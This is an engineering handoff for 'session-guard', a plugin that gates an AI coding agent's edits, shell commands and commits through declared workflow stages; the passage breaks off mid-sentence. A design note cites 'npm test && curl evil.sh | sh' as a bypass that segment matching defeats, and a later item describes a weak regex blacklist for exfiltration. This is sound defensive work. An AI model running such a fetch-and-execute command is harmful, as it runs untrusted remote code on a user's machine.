# Handoff — session-guard

Single continuation document. **Supersedes `handoff-2026-09-06.md` and
`handoff-2026-09-06-task-scope.md`**, which had drifted apart: the second
summarised the first's open list as "items 3, 6, 20-24" and silently dropped
14-19 and the dead e2e test. Every item below was re-checked against the code
when it was written, not carried over on trust — but sections carry the date
they were checked, and «Policy left the core» supersedes any older claim it
contradicts.

Last updated 2026-09-08.

## Where things stand

|                                   |                                                                                                                           |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| Branch                            | `main`                                                                                                                    |
| Last commit                       | `6e23ed0`; two days of work are **uncommitted in the working tree**                                                       |
| `mise run test`                   | 1677 pass / 0 fail                                                                                                        |
| `mise run typecheck`              | clean — **and it now covers `test/` and `scripts/`**, see below                                                           |
| `mise run lint`, `mise run build` | clean                                                                                                                     |
| `openspec validate`               | valid                                                                                                                     |
| `bun run smoke`                   | 2026-09-08: 7/11, plus `commit-cwd` and `commit-mismatch` re-run green after the harness fix — see «Policy left the core» |

**Read the section «Policy left the core» first.** Between 2026-09-07 and
2026-09-08 the runtime stopped holding the workflow's policy, and a good deal
of what the rest of this document describes was deleted and rebuilt somewhere
else. Sections below that predate it are still accurate about the machinery
they describe, but three names in them no longer exist.

**Read `mise run test`, not `npx vitest run`.** The suite is bun's. Under
vitest, 156 tests fail for reasons that have nothing to do with the code, and
at least one file (`test/app/mutation-orchestrator.test.ts`) imports `bun:test`
and cannot be collected at all. A count taken with the wrong runner is noise.

## Policy left the core — 2026-09-07 / 2026-09-08

Three things the runtime decided by itself were deleted and rebuilt as
declarations. The record made before the deletion, and used to rebuild from,
is `docs/gate-actions-before-removal.md` — it describes what each one did, in
what order, and what it stood between.

### What went

| Removed                                                                               | It used to                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `canCommit`                                                                           | refuse a commit unless every `requiredGates` passed and every task was completed                                                                                                                       |
| the `invariants` gate                                                                 | carry the engine's verdict about a move, under a hardcoded gate id                                                                                                                                     |
| `actionGuards`                                                                        | hold one expression for the whole graph — in practice `beginMutation: "session.approved('plan')"`                                                                                                      |
| `requiredGates` and `kind: pass \| fail`                                              | the field existed only to feed `kind`, and `kind` was sugar over a guard nobody wrote by hand                                                                                                          |
| `verifiers`, `terminalStages`, `stageLevelGuards`, `tools`, `settings`, `gateMapping` | nothing — six fields accepted by the schema and read by no one                                                                                                                                         |
| `TERMINAL_STAGES`                                                                     | name a stage terminal by a hardcoded list of words (`done`, `completed`, `cancelled`, …) — computed into `terminalStages` and read by nobody; `done`/`failed` now say so themselves with `actions: []` |

`requiredGates` defaulted to `['invariants']` in three places in the engine. It
outlived the gate it named for a day, which made `kind: pass` permanently false
and `kind: fail` permanently blocking for any profile that used them. Nothing
shipped did, so it never fired — but that is the shape of every landmine in
this repository: correct-looking, unreferenced, and armed.

### What replaced it: `actions:` on a stage

A stage now declares what may happen on it. This is the second axis beside
transitions: an edge answers «may we leave», an action answers «may we do this
while staying». A commit is not a transition, and neither is an edit.

```yaml
code:
  actions:
    - action: edit
      paths: ['**']
      guard: "session.approved('plan')"
    - action: bash
      commands: ['git status', 'git diff.*']
      guard: "session.approved('plan')"
```

- The vocabulary is closed and names **host tools**: `bash` and `edit` (the
  family `edit`/`write`/`apply_patch`). There is deliberately no `commit`
  action — no such tool exists, a commit arrives as `bash`.
- Entries are a list, not a map, because one action needs several entries:
  `edit` splits by path mask, `bash` by command.
- Order decides. The first entry whose discriminator matches **and** whose
  guard holds wins — the same rule `mergeTransitions` uses for several edges on
  one pair.
- `actions` absent means no restriction. Declared, it is exhaustive: nothing
  matched means refused.
- `delivers: true` on a `bash` entry marks the delivery. The core reads it to
  decide _not_ to enter the mutation lifecycle, to issue the `deliveryPermit`
  before, and to verify HEAD after. The `commands:` on that entry are also what
  **identifies** the call — the core no longer looks for `commit-task.ts` by
  name, except as a fallback when the stage declares nothing.

The compiler refuses `paths:` outside `edit` (a `bash` call carries no path,
only `workdir`, so the mask could never be enforced), `commands:` outside
`bash`, `delivers` outside `bash`, `delivers` without `commands`, a mask with
no wildcard (`src/auth` matches that one path and nothing inside it), and a
command pattern that is not a regular expression.

**Command patterns match per shell segment, anchored.** `shellSegments` is now
exported from `session-queries.ts`, and every segment must match some pattern —
`every`, not `some`. A regex over the raw string would pass
`npm test && curl evil.sh | sh` on a pattern of `npm test`. The same rule
`isReadOnlyBashCommand` already used.

Taking tree-sitter-bash from opencode was considered and declined: its wasm is
compiled into the 137MB binary (`find` over the Cellar returns zero `.wasm`
files), the plugin API does not expose the parser, and our own splitter already
fails closed. The difference is false refusals on compound commands, not holes.
`commandMatches` is one function with one call site, so swapping it later is a
local change.

### The engine's verdict is a field, not a gate

`run.checks` (and `operation.checks` for the move that produces it) holds what
the core decided about a move by looking at the disk: did the tool fail, did it
write outside the task's `writeScope`, could the diff be computed, do the
profile's invariants hold. Guards read it as `task.checks`.

**It is deliberately not a gate.** `run.gates[...]` is written from an agent's
`<workflow-result>`, and the only check is that the stage declared that name —
so an agent can set any gate its stage declares. For `review` and `qa` that is
the point. This verdict is the one thing the engine determines for itself, and
in the same namespace an agent could forge it. The trap would have been quiet:
a profile listing the gate in `gates:` and also naming it as the verdict's
target opens the door without looking like it.

It is not a guard either, and could not be: `GuardEvaluator.evaluate` is
synchronous, the check shells out to git and dynamically imports the profile's
`invariants.ts`, guards are evaluated on every edge of every transition check,
and by the time a guard runs the operation carrying the baseline frame is
already deleted. The _reading_ side is a guard; only the storage was in
question.

`checks` and not `invariants` because it folds four causes and invariants are
one of them.

### Where the policy lives now

`profiles/base/base.yaml` declares actions on **every** stage, so a refusal is
a rule rather than a coincidence:

| Stage                                   | May do                                                                                        |
| --------------------------------------- | --------------------------------------------------------------------------------------------- |
| `planning`, `tasks_ready`, `validation` | read-only git                                                                                 |
| `execution` → `code`                    | `edit` anywhere and read-only git, both once the plan is approved                             |
| `commit`                                | the delivery, guarded by every task completed and both verdicts collected; plus read-only git |
| `done`, `failed`                        | `actions: []` — nothing                                                                       |

Before this, those stages refused with «Cannot resolve a single workflow task
run for mutation» — the mutation lifecycle failing for a plumbing reason,
which happened to look like protection. Verified by driving the real hooks
against every stage.

**Inheriting a stage replaces its `actions` wholesale.** A stage merges field
by field, and `actions` is one field. `android` adds `./gradlew` and therefore
repeats the `edit` entry — dropping it would remove the guard silently. There
is a test asserting all three shipped profiles still carry it.

The forbidden-`git commit` rule became a **default** rather than a law: it
applies only when the acting stage declares no actions (or the profile cannot
be read). A stage that declares actions answers for itself, and a profile that
wants to deliver through plain `git commit` can now say so.

### Host smoke, 2026-09-08 — what it caught that 1680 tests did not

Run for the first time since the policy moved out of the core. Four failures,
**one of them the plugin's**:

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- |
| **The first edit of a task was refused.** `beginMutation` opens the loop run _after_ the action is admitted, so the first edit of every task arrives with no run open — and `actingStageActions` judged it by the outer `execution` stage, which permits no edits. Closing the hole closed the work with it. The resolver now defers to the loop's first nested stage, which is where the run will open: the same rule `resolveMutationRun` follows. Admission and lifecycle disagreeing _was_ the bug. | `src/app/runtime.ts`        |
| **The harness asserted the `invariants` gate**, deleted a day earlier. Moved to `run.checks`.                                                                                                                                                                                                                                                                                                                                                                                                           | `scripts/host-smoke/run.ts` |
| **The harness committed without passing through `validation`.** It marks tasks completed directly, so no session-level `review`/`qa` is produced, `validation → commit` never fires, and the session never reaches the stage that declares the delivery. This used to work because `commitBefore` issued a permit _from any stage_ — the stage took no part. It does now, deliberately. Two verifier steps added.                                                                                       | `scripts/host-smoke/run.ts` |
| `cicd-full-cycle` timed out (a harness error, not a refusal) and `verify-loop` failed on the model refusing to dispatch `reviewer` seven times. Reproduced the same loop locally against the real hooks: the task moves `code → verify` correctly.                                                                                                                                                                                                                                                      | —                           |

**And reproducing that last one by hand found a defect the report never showed.**
A delta profile inherits the _list_ of invariant ids through
`profile.json.extends`, but `invariants.ts` was looked up only in the profile's
own directory. `smoke` therefore threw `InvariantsUnavailableError` on every
move, and the `catch` turned that into a failed verdict — every task move in
every delta profile marked as failing its checks. It predates this work;
restoring `run.checks` is what made it observable. The file is now resolved
along the `extends` chain.

The lesson worth keeping: unit tests construct state, smoke walks the cycle.
Everything above is invisible to the first kind by construction.

### Declaration order is the contract — by decision

There is no `initial:` and no `entry:`. The first stage declared is where the
workflow starts; the first stage inside a loop is where a task run opens _and_
what the task's first edit is judged by. The operator chose to keep the order
rather than name it.

That makes reordering two YAML blocks a behavioural change that looks like
formatting, so it is pinned: `test/schema/declaration-order.test.ts` asserts all
three consequences against the shipped `base`, and reordering either
`planning`/`tasks_ready` or `code`/`verify` fails the build. Documented for
profile authors in `profiles/README.md` and `docs/schema-reference.md`.

### The typecheck covers tests now

`tsconfig.json` includes `test/**` and `scripts/**`; `rootDir` is gone (it
conflicted and was never needed under `noEmit`). This cost 153 accumulated
errors, all fixed. It was worth it three times over: the same gap had hidden
`kind: 'auto'`, `requiredGates:` and `action: 'commit'` in test literals after
each of those was deleted — the tests stayed green while asserting nothing.

What it caught that was not cosmetic: `scripts/tmr-workflow-create.ts` (deleted
— it called `engine.derivePhase` and `mergeSchemasToEngineConfig`, neither of
which exists, and nothing referenced it), two live imports of the deleted
`canCommit`, `baselineHashes` in the fixtures of eight test files, and a name
collision between two exported `AdmissionResult` types.

Two helpers were added rather than scattering casts: `test/support/tool-result.ts`
narrows `ToolResult` (it is `string | { output }`) and **throws** on the string
branch instead of asserting; `test/support/host-payload.ts` is a narrow, named
cast used only at the boundary with `@opencode-ai/plugin` types. Our own types
must not pass through it.

Still open: `strictNullChecks` is `false`, so discriminated unions do not
narrow. Two places cast explicitly because of it, and `AdmissionResult` in
`action-admission.ts` was written flat for the same reason.

### Host smoke, 2026-09-06

Every scenario except `cicd-full-cycle`, which the operator asked to skip while
its profile is in progress. Report at `docs/host-smoke.md`.

| Scenario                                                               |                                                                                                                                                        |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| plugin-loads, no-session, create, git-block, commit-gate, plan-consent | PASS, 1 attempt                                                                                                                                        |
| task-control                                                           | PASS, 2 attempts                                                                                                                                       |
| verify-loop                                                            | PASS, 6 attempts — a prompt problem, not a finding, but six is worth looking at                                                                        |
| commit-mismatch                                                        | was ERROR `spawnSync is not defined` — **fixed** (`scripts/host-smoke/run.ts` used it at line 908 and never imported it); PASSes on re-run, 6 attempts |
| comprehensive-full-cycle                                               | FAIL — a real defect, item 0 below                                                                                                                     |
| commit-cwd                                                             | FAIL, reproduced twice, cause not established — see below                                                                                              |

**`commit-cwd` — what is known.** It fails with `commit-task: nothing
staged to commit`, on every attempt, in two separate runs. `commit-task.ts`
runs `git add -A` when it is given no paths (`scripts/commit-task.ts:52`), so
that message means the working tree was clean at that moment — the failure is
upstream of the commit step, in the preparation that should have left files to
commit. `commit-mismatch` uses the same `prepareCommittableSession` and passes,
so preparation is not broken in general. Not diagnosed further; do not assume
it is the model ignoring an instruction until someone has looked.

One lead worth checking first: `prepareCommittableSession`
(`scripts/host-smoke/run.ts:857`) still calls `workflow.tasks-set` with
`{ path, status }`, and `path` was **removed from `MutationTask` by
`fa78850`**. The harness may have been left behind by the task-scope change the
same way `android.yaml` was left behind by the stage model. Unproven — the
staging failure has not been traced to it.

The suite has been fully green since `f05fb1f`. Before it, eight failures were
carried for weeks — three from `CORE_GATES`, five from the android profile.

## What the last two changes did

**`fa78850` — task scope and per-move invariants.** Invariants became a
property of one move rather than of the session. `MutationTask` gained
`readScope` / `writeScope` / `editingAgents` and lost `path`, `manifest`,
`declaredScope`; `WorkflowSession.baselineHashes` is gone. `ActiveOperation`
gained `baseline` (the move's snapshot) and `invariants` (its verdict). New
`src/app/scope-match.ts`; `test/support/task-factory.ts` with ~56 literals
migrated onto it.

**`f05fb1f` — gates from the profile.** `CORE_GATES` and `KNOWN_GATES` are
gone. A session starts with no gates; `setGateStatus` upserts, so the first
verdict about a gate is what creates it. What a workflow waits on is declared
by the profile (`gates:` in `profiles/base/base.yaml`), and the compiler checks
a stage's `gates:` against that declaration. `profiles/android/android.yaml`
was rewritten as the delta it claims to be.

## Done 2026-09-07: the correctness list, `docs/plans/findings.md`, the funnel

Everything under "Correctness" below, all six items of `docs/plans/findings.md`,
and the error funnel. One commit each, every one mutation-tested — reverting
the fix fails a test that names what broke.

`test/e2e/live-workflow-create.test.ts` (item 4 below) was left alone by the
operator's decision.

### Correctness — all four closed

0. **`stage: 'mutation'`** (`b8292ea`). `beginMutation` now takes a resolver
   for the loop's first nested stage and refuses with a reason when none
   resolves, instead of parking the task in a stage no profile declares.
1. **`checkTransition` fail-open** (`184ca0c`). An edge carrying a guard,
   consent or a kind is refused without a session; an unconditional edge is
   still allowed, because that answer is about the shape of the graph. Three
   tests asserted the bypass _by name_ and now assert the refusal.
2. **Parent/child linkage** (`28ba4ff`). `SessionQueue` takes a parent
   resolver, walks the host's chain through `client.session.get` and memoises
   every node to its root; hook-driven reads go through `loadGoverning`.
   `workflow.create` keeps its own id. A host that cannot answer leaves the
   session as its own root.
3. **Optimistic concurrency** (`3e62e99`). `save` reads the file's revision
   inside its own lock chain and throws `WorkflowSessionConflictError` when it
   has moved, rolling the in-memory bump back. `SessionQueue`'s per-root map
   also drops its own tail now.

### `docs/plans/findings.md` — all six closed

1. **Commit blocked after the tasks finish** (`a11e254`). The commit is
   delivery, not an edit inside a loop: `mutationBefore`/`mutationAfter` skip
   it. It has its own lifecycle. _The memory of this being fixed earlier was
   wrong — it was still live._
2. **`bumpRetry: cycles`** (`37a615c`). A workflow has two budgets. The session
   schema accepts a workflow-level budget name beside a task id, and the
   compiler refuses the mirror mistake (`task.id` at workflow level).
3. **Replayed result** (`a030d48`). `processedResultCallIDs` on the session;
   a second delivery is refused with `[workflow-result-replayed]`.
4. **Lock release evicting a live task** (`b2889a0`). An operation records its
   `kind`. Lock release ends a task call only by expiry, and `beginMutation`'s
   occupancy check counts only other mutations — the writes a dispatched task
   performs are what it was dispatched to do. That path only ever worked
   because lock release deleted the task to make room.
5. **Alternative transitions** (`b22484a`). `mergeTransitions` groups edges by
   pair: a child replaces the parent's group as a whole, multiplicity and order
   survive.
6. **Project isolation** (`e7a39da`). The plugin hands its computed paths to
   the instance instead of writing them into `process.env`. Covered by two
   plugin instances in one process, each listing only its own profiles.

### The funnel — built

`7f0389c` and `fdd04f8`.

- **Guard syntax is parsed at compile time** — every transition guard at both
  levels, entry and exit guards, stage-assignment conditions, and — since
  `actions:` arrived — every action entry's guard. (`actionGuards` itself is
  gone; see «Policy left the core».)
  `session.gates.(((` used to compile clean and read `false` for ever.
- **Unknown keys are reported as compile errors**, with a path and the allowed
  names. `ProfileSchemaSchema` stays `.passthrough()`; the complaint moved to
  where the undeclared gate already was. All three shipped profiles compile
  clean.
- **One rule, one switch** (`src/app/report.ts`): an error reaches the operator
  as readable text, always goes to the log, and shows as a toast when
  `STATE_MACHINE_LOG_LEVEL=debug`. `DEBUG_TUI=0` only turns toasts off. A
  refused tool call is reported as well as thrown, and the task-control
  authority check returns a broken profile's own failure as text instead of
  letting `ProfileConfigurationError` escape raw.
- **Item 7 of the lower-priority list went with it**: the raw tool arguments
  dumped on every call moved from `info` to `debug`.

## Done 2026-09-07, evening: reported defects, the shared readers, the schema

Ten reports came in over the evening, most asked as «это дефект?». Three
turned out not to be, at the severity claimed, and saying so is part of the
record: every one described a real mechanism, and the work was separating that
from a real consequence. Everything below was reproduced before it was
touched, and each fix has a test that fails without it.

### Confirmed and fixed

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| **A parent blocked its own child.** `serial` admission counted every open run in the session, so a running parent in `parents` refused its child in `task-1` with «Serial task cycle admits only the next unfinished task» — and then waited for a child that could not start. `taskAdmissionRejection` now splits two scopes: `cycleRuns` (same `listKey`) drives `serial`, `maxConcurrent` and the `serial_with_overlap` order checks; session-wide `activeRuns` still drives `writeScope` overlap, because the diff is split by path, not by list. | `src/app/runtime.ts`                |
| **A circular `extends` chain resolved half-assembled.** `break` kept the walk finite and told nobody. It throws now, naming the cycle. The missing-parent branch two lines below had always thrown — same authoring mistake, same answer.                                                                                                                                                                                                                                                                                                             | `src/app/profile-resolver.ts`       |
| **A deleted session came back.** `WorkflowStore.delete()` took neither the in-process chain nor the file lock, so a `save()` already holding its payload renamed the file back afterwards. 20/20 before, 0/20 after.                                                                                                                                                                                                                                                                                                                                  | `src/session/session-store.ts`      |
| **One stray file hid every session.** `list()` threw `URIError` out of the loop on an undecodable name.                                                                                                                                                                                                                                                                                                                                                                                                                                               | `src/session/session-store.ts`      |
| **The dashboard was doubly stale.** It stripped `.json` by first match (`a.jsonb.json` → session `ab.json`), decoded outside its own `try`, and its live update had never worked: the client keyed on `data.rootSessionID` and a `data.event` wrapper, neither of which the server has ever sent.                                                                                                                                                                                                                                                     | `src/dashboard/*`                   |
| **`onFailure: retry` did nothing.** Implemented as what it always meant — the edge closes on `isExhausted(from)`, and taking it spends an attempt against the stage's own `retryBudget`. `terminal` needed no code: once the retry edge closes, the next open edge out of the stage is the terminal one.                                                                                                                                                                                                                                              | `src/domain/engine.ts`              |
| **An invariant failure spent a retry attempt.** Recording a verdict is not retrying. The runtime already spends one on the move that retries (`spendOnFailure`, `recordTaskRetryFailure`), so this was a second, independent source — a task could exhaust its retries without a single retry having been taken.                                                                                                                                                                                                                                      | `src/domain/operation-lifecycle.ts` |
| **A stage typo was invisible.** `validateKnownKeys` in the compiler already refuses unknown keys with a good message, but zod stripped stage keys before it could see them: `allowedAgent` for `allowedAgents` gave a stage with no agent restriction, silently. `StageDefSchema` is `.passthrough()` now, like the root.                                                                                                                                                                                                                             | `src/schema/profile-schema.ts`      |
| **`verifiers` deleted.** Carried by loader, resolver and the compiler's key list; read by nothing. Removed from the schema, the type, three shipped profiles, three smoke profiles, two fixtures and the README.                                                                                                                                                                                                                                                                                                                                      | everywhere                          |

### Reported, reproduced, and not defects at the severity claimed

- **`parentCache` seeded before validation.** Real mechanism, wrong consequence: nothing in `src` writes `testStatus['parentID']`, so the entry was always `sessionId → sessionId` — not a child attached to somebody else's queue but a child declared its own root, which suppresses the host lookup. Fixed anyway, and `testStatus` deleted: the field had no writer at all.
- **`MatchedRulesStateStore` swallows write failures.** By design, and now said so in the class doc: the only consumer is the TUI sidebar, no gate or transition reads it, and both writers are hook handlers with nothing to retry. What was actually wrong was the JSDoc (`@throws` implied other errors propagate) and that the warning was debug-gated, so a lost write left no trace at all. Both fixed.
- **Two store instances lose a merge.** True, 20/20 — and 0/20 on one instance, which is what production builds. `src/rules/index.ts` is a test-only export. Recorded in the class doc rather than fixed; the cross-process lock lives in `WorkflowStore`, where a lost write costs workflow state.

Two more came out of the work rather than the reports: a route id reaching the
loader still percent-encoded (real, fixed, but unreachable while session ids
are `ses_[A-Z0-9]+`), and SSE frames enqueued as strings, which only Bun's own
server tolerates.

### The shared readers

Three places knew independently how a session id becomes a file name — the
store, the dashboard and the TUI — and had already drifted. `src/session/session-files.ts`
is the one owner now (`sessionFileName`, `sessionIdFromFileName`,
`listSessionIds`, `readSession`, `readAllSessions`), re-exported from
`src/public-api.ts`, which is the internal door for the TUI and the dashboard.
Readers return a schema-validated `WorkflowSession`; absent, unparseable and
off-schema are one answer, `null`. Legacy shapes are deliberately not carried:
one current schema, migrations out of scope by decision.

**The dashboard is testable now.** `dashboard-server.ts` was 770 lines with
zero exports that started a server, a watcher and two timers at import and
computed eight paths from `import.meta.dir` at load. It is 71 lines of
environment and socket; everything else is `createDashboard(config)` in
`dashboard-app.ts`, every directory an argument. The old assertions matched
against the file's own source and broke three times on comments that merely
mentioned the wrong word; they are 17 behavioural tests driving real
`Request`/`Response` objects.

**`/api/agents/:id/prompt` answers.** It read `<repo>/agent/<agent>.md`, a flat
directory this project does not have — the layout of the _previous_ project,
where `../harness/agent/` still exists. The sync writes
`<harness>/agents/<profileId>/<agent>.md`, so the endpoint now takes the
profile from the newest session, and `/api/agents/:profileId/:agentId/prompt`
names it explicitly.

### Profiles

`profiles/base/agents/` and `profiles/harness/agents/` exist. Both profiles
declared agents and shipped no prompt files at all; only `android` had any, and
they are Android-specific down to «Ты — Senior Android Architect». The six base
prompts were rewritten neutral — no Kotlin, no Jira, Confluence, Figma,
Proxyman, Mobile MCP, `ast-index`, detekt or `TMR-` keys — keeping what belongs
to the harness itself: stage names matching `base.yaml`, session facts, the
consent-request block, the `<workflow-result>` marker, visibility restrictions,
the delegation rule and the git-safety classification. Stack specifics are
_requested_ from the profile rather than described.

The agent roster rule changed with them: a declared `agents` list in
`profile.json` is the source of truth, and when a profile declares none the
default is the `*.md` in its own agents directory (`listProfileAgents`). The
sync obeys the same roster. And `ProfileResolver` now **accumulates** agents
down the `extends` chain, deduped, child first — it used to take the nearest
ancestor that declared any, so a child naming one agent of its own silently
lost every agent its parent shipped.

## Open — verified, in the order I would take them

### Waiting on the operator, raised 2026-09-07 evening

1. **What `failed` should mean — and `done` with it.** ~~Neither is
   enforced~~ — **half closed**. `terminalStages` and its hardcoded
   `TERMINAL_STAGES` are gone, and `base` now declares `actions: []` on both
   stages, so nothing can be _done_ there: a probe against the live runtime
   refuses an edit, a bash call and a commit on either. What is still not
   answered is the other half — `failed` carries no reason. Why the workflow
   stopped is nowhere in the session, so «finished», «failed» and «stuck» still
   read alike to anyone looking at the file. Option 4 of the four once put to
   the operator: require the entry to record which gate failed or which budget
   ran out.

2. ~~**`settings` is read by nothing.**~~ **Closed** — deleted, together with
   `tools` and `gateMapping`, both equally unread. That is six such fields
   removed in total; see the table under «Policy left the core».

3. **A cross-process lock for `MatchedRulesStateStore`.** Offered, not done.
   Two instances over one state directory lose a merge every time. It does not
   bite today (one store per runtime, and the state is a sidebar hint), so the
   limitation is written into the class doc instead. `withFileLock` in
   `WorkflowStore` is the pattern, and it is private — extracting it touches
   the session store, which is why this was not done unasked.

4. **`strictNullChecks` is off.** `tsconfig.json` sets it `false`, and the
   consequence is not cosmetic: TypeScript will not narrow a discriminated
   union, so `if (!result.ok)` does not make `result.error` reachable. Three
   places work around it — two casts in tests and one type in
   `action-admission.ts` written flat rather than as a union. Turning it on is
   its own change and probably a large one; the workarounds name the reason
   where they sit.

5. **The dashboard and TUI have no notion of a terminal session.** Related to
   item 1: `done` and `failed` now refuse every action, but nothing tells a
   reader the session is finished. That was option 2 of the four, and it is
   still worth doing beside option 4.

6. **`parseRuntimeState` carries unreachable tolerance.** It accepts `gates`
   as an array _or_ an object, `tasks` as either, and a missing `sessionId`
   standing in as `rootSessionID` (`src/tui/tui.ts:158-260`). The TUI reads
   schema-validated sessions now, so those branches cannot be entered. Left in
   place deliberately: clearing them is its own change, not a rider on this
   one.

### Schema machinery — status corrected

The morning handoff listed 14-19 as open. Re-checked:

|     | Claim                                                                                   | Now                                                                                                                                                                                                 |
| --- | --------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 14  | `compileWorkflow` never called from `src`                                               | **closed** — `src/app/mutation-orchestrator.ts:263`                                                                                                                                                 |
| 15  | `exitGuards` unread, `stageLevelGuards` unpopulated                                     | **half** — the array form is read (`src/domain/task-movement.ts:76`); `stageLevelGuards` is still never populated, `schemaToEngineConfig` does not return it                                        |
| 16  | `onFailure` has no consumer                                                             | **closed** — `retry` implemented, `terminal` needs nothing; see below                                                                                                                               |
| 17  | no profile uses `kind: pass\|fail`                                                      | **open** — it appears only in `profiles/android/task-cycles.yaml`, which declares itself unregistered                                                                                               |
| 18  | `deriveStageFn` falls back to `'PLANNING'`                                              | **open** — see the stage-name audit below                                                                                                                                                           |
| 19  | `editingAgents` / `verifiers` are declarative only (`verifiers` has since been deleted) | **closed** — schema-level `editingAgents` is read by `engine.getEditingAgents()` (`src/app/runtime.ts:967`) to classify whether a stage edits; `verifiers` was read by nothing and has been deleted |

### Testing

4. **`test/e2e/live-workflow-create.test.ts` runs zero tests.** Verified by
   running it: `0 pass, 0 fail, Ran 0 tests`. It is a script with `main()` and
   no `describe`/`it`, named `.test.ts`. It looks like coverage and is not.
   Delete it or give it a body — either is fine, leaving it is not.
   **Left alone on 2026-09-07 by the operator's decision** while the rest of
   this list was cleared.

5. **Beware weak tests generally.** `test/dashboard/dashboard-contract.test.ts`
   asserted stage descriptions against uppercase stage ids that no caller
   produces, so it stayed green while the feature was dead in production (fixed
   this session, see below). Several others assert nothing
   (`expect(step).toBeTruthy()` on a string literal) or set a different field
   from the one their name claims. When a test passes, check that it fails
   without the fix.

### Lower priority

6. `src/app/workflow-module.ts` — `isDuplicate(snapshot, cmdId)` is called with
   a freshly generated `cmdId`, so it is always false; `validateSnapshot` is an
   empty placeholder; `loadSnapshot` swallows corrupt JSON and returns `null`,
   silently resetting the run.
7. ~~raw tool arguments dumped at `info` on every call~~ — **closed**
   (`fdd04f8`); they are at `debug` now.
8. `src/app/guardrails.ts` is a regex blacklist: `\beval\s*\(` and unanchored
   `printenv` fire on ordinary coding output, and `git push --force` sits in
   `DATA_EXFILTRATION` at severity `warn`, so it is never blocked.
9. **Archive the openspec changes.** There is no `openspec/archive/` at all,
   and `openspec/specs/` does not exist, so the project has no baseline spec.
   `task-scope-and-per-move-invariants` (43/43) and `bugfixes-p1-p2` (36/36)
   are complete and unarchived.
   The four changes showing zero done tasks — `data-layer`, `domain-layer`,
   `plugin-runtime`, `session-store` — are **old and to be discarded** (the
   operator's call, 2026-09-06). Their proposals describe machinery the code
   already has: `session-store`'s proposal is a description of the existing
   `WorkflowStore`. Do not treat their 76 unticked boxes as backlog.

### Deferred by decision

- **`WorkflowStore.load()` returns `null` both for a missing file and for a
  schema mismatch** (`src/session/session-store.ts:126,149`). A governed
  session that stops parsing silently leaves the state machine's control.
  Deferred to release: migrations are ignored during active development.
- **The plan that moves commit into the schema is frozen**
  (`docs/plans/task-11-12-commit-as-ordinary-step.md`). Too raw. The old commit
  lifecycle stays as evidence-gathering: `deliveryPermit` /
  `deliveryReceipt` and the `git diff-tree` comparison are still the core's.
  `canCommit` is **gone** — the condition it computed is now the delivering
  entry's own `guard:` in `base.yaml`. Do not implement the frozen plan.
- **Dispatching an agent on any stage** — investigated 2026-09-06, decision
  postponed, code untouched. See the section below.
- **The attempt ledger** for `task-scope-and-per-move-invariants`: the attempt
  is settled `passed`, but the objective is `blocked: maintainer_decision`
  (2589 changed lines against a declared 1500). It only bites if a new work
  unit is opened against the same objective. Clearing it needs
  `gentle-ai sdd-attempt reset`, explicitly a maintainer decision.

## Stage-name audit — every `planning` / `PLANNING` outside tests

Asked for on 2026-09-06. Four groups, only the first two are defects.

**Uppercase literals that match no stage.** Stage ids are lowercase everywhere
a profile writes them, so these never compare equal to a real stage:

- `src/domain/engine.ts:127,134` — `deriveStageFn` returns `'PLANNING'` twice:
  when the rule list is empty and `currentStage` is absent, and when no
  assignment rule matched. `base.yaml` declares no `stageAssignments`, so the
  first branch returns `facts.currentStage` (schema default `'planning'`) and
  the literal is unreachable there. Profiles that do declare rules — the
  host-smoke profiles, `task-cycles.yaml` — reach the second, and a caller then
  looks up a stage no profile has: `engine.getStages()['PLANNING']` is
  `undefined`, task admission refuses with "does not declare an executable task
  loop", and `checkTransition` reports "Illegal stage transition" naming a
  stage that does not exist. It fails closed, but the message is a lie.
  Most shipped rule sets end in a `condition: 'true'` catch-all, which is why
  this has not bitten yet.
  **Not fixed here, because it is not a rename.** The honest fallback is the
  workflow's initial stage — `compileWorkflow` already computes `initialStage`
  — or `facts.currentStage`, on the grounds that a stage nobody selected has
  not been left. Both change behaviour, and three tests in
  `test/domain/derive-phase.test.ts` currently assert `'PLANNING'` by name, so
  they specify the defect. Decide the fallback, then change the tests with it.
- `profiles/android/agents/orchestrator.md:40` documents `PLANNING` to the
  agent. Prompt text, not code, but it teaches the wrong name.

**Pre-stage-model chains left behind by the migration — fixed, see below.**
This was the same family as the `phases:` block still sitting in
`android.yaml`, and it ran through the whole TUI. Written up under "The TUI
read a session shape that no longer exists".

**A hardcoded default that belongs to one profile.** `'planning'` is the base
workflow's first stage, written into the core as a fallback:
`src/session/session-store.ts:37`, `src/session/session-schema.ts:252`,
`src/app/runtime.ts:632,1265`, `src/app/mutation-orchestrator.ts:385,454`.
A profile whose first stage is named anything else silently starts in a stage
it does not declare. The compiler already computes `initialStage`; this should
come from there. Low urgency — every shipped profile happens to name it
`planning` — but it is the same class of defect as the gate list that used to
be hardcoded.

**Legitimate.** `profiles/base/base.yaml`, the host-smoke profiles,
`scripts/host-smoke/run.ts` assertions, and the comments in `android.yaml` all
name `planning` because it is the stage they mean.

## Dispatching an agent on any stage — investigated, postponed

The operator's requirement: an agent should be able to run at any stage, at any
nesting level, in a loop or not. Concretely, `planning` should run the
`architect` subagent, which writes the plan against jira and confluence.
Investigated 2026-09-06; **no code was changed**, the decision is the
operator's and will be taken separately.

- **The harness launches nothing.** It is a plugin. `handleTaskBefore` runs on
  `tool.execute.before` for `tool === 'task'` — the orchestrator has already
  decided to call `task(subagent_type: …)`, and the state machine admits it or
  throws `WorkflowBlockedError`. The operator chose to keep it that way: the
  state machine stops refusing, the orchestrator still originates the call.
- **`dispatch:` is not "who to launch".** Only `strategy` and `maxConcurrent`
  are read from it (`src/app/runtime.ts:992`), and only as
